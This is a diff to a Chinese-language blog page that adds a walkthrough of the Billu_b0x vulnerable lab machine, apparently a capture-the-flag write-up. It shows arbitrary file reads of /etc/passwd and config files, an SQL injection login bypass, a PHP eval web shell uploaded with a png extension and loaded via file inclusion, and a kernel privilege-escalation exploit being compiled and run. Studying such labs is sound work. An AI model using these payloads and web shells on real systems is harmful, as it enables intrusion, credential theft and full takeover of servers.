@@ -21,8 +21,12 @@
 <meta property="og:image" content="https://i.loli.net/2021/05/10/LTVUujl9rsOqKHm.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png">
 <meta property="og:image" content="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png">
+<meta property="og:image" content="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png">
 <meta property="article:published_time" content="2021-05-10T14:20:36.000Z">
-<meta property="article:modified_time" content="2021-05-10T16:49:58.670Z">
+<meta property="article:modified_time" content="2021-05-11T08:37:55.796Z">
 <meta property="article:author" content="Du1">
 <meta property="article:tag" content="渗透">
 <meta name="twitter:card" content="summary">
@@ -122,7 +126,7 @@
 
     </div>
     <div id="toc">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li></ol>
     </div>
   </span>
 </div>
@@ -229,6 +233,58 @@
 <p><img src="https://i.loli.net/2021/05/10/toaRemSF38Whsqk.png"></p>
 <p>发现 <code>/var/www/html/config/config.php</code> 中的这一句：<code>$conn = mysqli_connect(&#39;localhost&#39;, &#39;root&#39;, &#39;ctf_pasti_bisa&#39;, &#39;ceban_corp&#39;)</code>。好家伙，数据库是 root 用户，直接 <code>su root</code> 登一波，发现 flag2</p>
 <p><img src="https://i.loli.net/2021/05/11/JCRpyBb3YlXrcuz.png"></p>
+<h1 id="Billu-b0x"><a href="#Billu-b0x" class="headerlink" title="Billu_b0x"></a>Billu_b0x</h1><p>Nmap 扫描一下端口及服务：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">22&#x2F;tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">80&#x2F;tcp open  http    Apache httpd 2.2.22 ((Ubuntu))</span><br></pre></td></tr></table></figure>
+
+<p>访问一下 http 服务，发现是一个登陆页面，提示说 “Show me your SQLI skills”，应该是要 sql 注入。</p>
+<p>扫一下，得到一些页面：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[07:43:17] 200 -  307B  - &#x2F;add</span><br><span class="line">[07:43:19] 200 -    1B  - &#x2F;c</span><br><span class="line">[07:43:21] 200 -    1KB - &#x2F;images&#x2F;</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index</span><br><span class="line">[07:43:21] 200 -    3KB - &#x2F;index.php</span><br><span class="line">[07:43:21] 200 -   47KB - &#x2F;in</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel  -&gt;  index.php</span><br><span class="line">[07:43:22] 302 -    2KB - &#x2F;panel.php  -&gt;  index.php</span><br><span class="line">[07:43:23] 200 -    8KB - &#x2F;phpmy&#x2F;</span><br><span class="line">[07:43:23] 200 -    1B  - &#x2F;show</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test</span><br><span class="line">[07:43:24] 200 -   72B  - &#x2F;test.php</span><br></pre></td></tr></table></figure>
+
+<p>在 test.php 发现任意文件下载：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;POST http:&#x2F;&#x2F;192.168.237.134&#x2F;test.php</span><br><span class="line">file&#x3D;&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+
+<p>可以把所有页面的源码下载下来：</p>
+<ul>
+<li>add.php 是一个无法使用功能的上传页面</li>
+<li>in.php 里是 phpinfo，没有有用信息</li>
+<li>c.php 是数据库连接文件，发现 <code>$conn = mysqli_connect(&quot;127.0.0.1&quot;,&quot;billu&quot;,&quot;b0x_billu&quot;,&quot;ica_lab&quot;);</code>，从而知道数据库连接的用户名密码</li>
+<li>/etc/passwd 中有一个 id 为 1000 的用户，名为 ica</li>
+</ul>
+<p>访问 phpmy，用我们获得的数据库密码去登录访问。</p>
+<p><img src="https://i.loli.net/2021/05/11/GljBuzU34ZPCo9I.png"></p>
+<p>获取到 index.php 中登陆的用户名与密码。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">biLLu</span><br><span class="line">hEx_it</span><br></pre></td></tr></table></figure>
+
+<p>进入。</p>
+<p><img src="https://i.loli.net/2021/05/11/Ty48Kgz7LcniF3P.png"></p>
+<p>panel.php 中存在任意文件包含：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;continue&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;add&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$choice</span>===<span class="string">&#x27;show&#x27;</span>) &#123;&#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">include</span>(<span class="variable">$dir</span>.<span class="string">&#x27;/&#x27;</span>.<span class="variable">$_POST</span>[<span class="string">&#x27;load&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>再看一下 upload 的上传逻辑吧：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$r</span>=pathinfo(<span class="variable">$_FILES</span>[<span class="string">&#x27;image&#x27;</span>][<span class="string">&#x27;name&#x27;</span>],PATHINFO_EXTENSION);</span><br><span class="line"><span class="variable">$image</span>=<span class="keyword">array</span>(<span class="string">&#x27;jpeg&#x27;</span>,<span class="string">&#x27;jpg&#x27;</span>,<span class="string">&#x27;gif&#x27;</span>,<span class="string">&#x27;png&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (in_array(<span class="variable">$r</span>,<span class="variable">$image</span>)) &#123;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>那就直接写个 <code>&lt;?php @eval($_POST[&quot;Du1&quot;]);phpinfo(); ?&gt;</code> 的🐎，后缀改下 png，传上去包含一下就 ok 了：</p>
+<p><img src="https://i.loli.net/2021/05/11/omna17ShKRxqwpQ.png"></p>
+<p>反弹一下 shell，然后怎么都反弹不回，很烦，所以直接写个🐎到 upload_images 里面：<code>echo%20&#39;&lt;?php%20eval($_POST[&quot;Du1&quot;]);?&gt;&#39;%20&gt;%20uploaded_images/1.php</code>，蚁剑连上：（uploaded_images 有写权限）</p>
+<p><img src="https://i.loli.net/2021/05/11/oPXG5jDAetKrfgC.png"></p>
+<p><code>uname -a</code> 与 <code>cat /etc/issue</code> 查看内核及系统版本，寻找提权 exp：<a target="_blank" rel="noopener" href="https://www.exploit-db.com/exploits/37292/">https://www.exploit-db.com/exploits/37292/</a></p>
+<p>然后传上去：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 exp.c  # 赋予权限</span><br><span class="line">gcc exp.c -o exp  # 编译</span><br><span class="line">./exp  # 执行，提权至 root</span><br></pre></td></tr></table></figure>
+
+<p>登录那里其实还有另一种解法：之前提到过 sql 注入，我们可以审计一下 index.php 源码：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$uname</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;un&#x27;</span>]));</span><br><span class="line"><span class="variable">$pass</span>=str_replace(<span class="string">&#x27;\&#x27;&#x27;</span>,<span class="string">&#x27;&#x27;</span>,urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;ps&#x27;</span>]));</span><br><span class="line"><span class="variable">$run</span>=<span class="string">&#x27;select * from auth where  pass=\&#x27;&#x27;</span>.<span class="variable">$pass</span>.<span class="string">&#x27;\&#x27; and uname=\&#x27;&#x27;</span>.<span class="variable">$uname</span>.<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>很简单的过滤，把单引号去掉，我们用 <code>\</code> 逃逸掉就 ok 了：<code>ps=\&amp;un=or 1=1 #</code>。</p>
+<p>对于 root 的话，还有一个点，就是 phpmyadmin 的配置文件读取：<code>/var/www/phpmy/config.inc.php</code>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;root&#x27;</span>;</span><br><span class="line"><span class="variable">$cfg</span>[<span class="string">&#x27;Servers&#x27;</span>][<span class="variable">$i</span>][<span class="string">&#x27;password&#x27;</span>] = <span class="string">&#x27;roottoor&#x27;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>直接拿到 root 密码。</p>
+<hr>
+<p>注：</p>
+<ul>
+<li>提权方法可以多关注主要的配置文件、数据库连接文件、用户的文件，也可以利用Ubuntu已知漏洞本地提权</li>
+<li>MySQL 有可能被高线程目录暴破和注入宕机</li>
+</ul>
 
   </div>
 </article>
@@ -258,7 +314,7 @@
     </div>
 
     <div id="toc-footer" style="display: none">
-      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li></ol>
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Me-and-My-Girlfriend-1"><span class="toc-number">1.</span> <span class="toc-text">Me and My Girlfriend: 1</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Billu-b0x"><span class="toc-number">2.</span> <span class="toc-text">Billu_b0x</span></a></li></ol>
     </div>
 
     <div id="share-footer" style="display: none">
